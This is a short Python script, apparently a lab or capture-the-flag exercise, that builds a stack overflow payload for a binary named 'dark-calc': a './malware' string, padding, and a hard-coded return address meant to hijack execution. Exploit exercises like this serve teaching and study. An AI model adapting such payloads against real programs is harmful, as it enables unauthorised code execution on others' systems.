#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc."""
import sys
import struct

p64 = lambda x: struct.pack("<Q", x)

payload  = b"./malware\x00"     
payload += b"A" * 6              
payload += b"B" * 8             
payload += p64(0x401a67)         

sys.stdout.buffer.write(payload)
